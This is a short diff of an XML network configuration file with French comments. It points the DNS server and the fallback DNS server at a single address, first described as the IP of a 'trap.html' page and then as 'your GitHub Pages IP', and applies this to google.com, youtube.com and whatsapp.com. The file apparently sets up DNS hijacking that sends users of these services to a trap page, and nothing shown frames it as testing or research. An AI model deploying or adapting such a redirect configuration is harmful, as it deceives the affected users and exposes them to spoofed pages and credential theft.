@@ -1,9 +1,9 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <network-config>
     <dns>
-        <!-- Redirige tout vers l'IP de ta page trap.html -->
-        <server>89.234.184.249</server>
-        <fallback-server>89.234.184.249</fallback-server>
+        <!-- Redirige tout vers TON IP GitHub Pages -->
+        <server>185.199.109.153</server>
+        <fallback-server>185.199.109.153</fallback-server>
         <domain>google.com</domain>
         <domain>youtube.com</domain>
         <domain>whatsapp.com</domain>
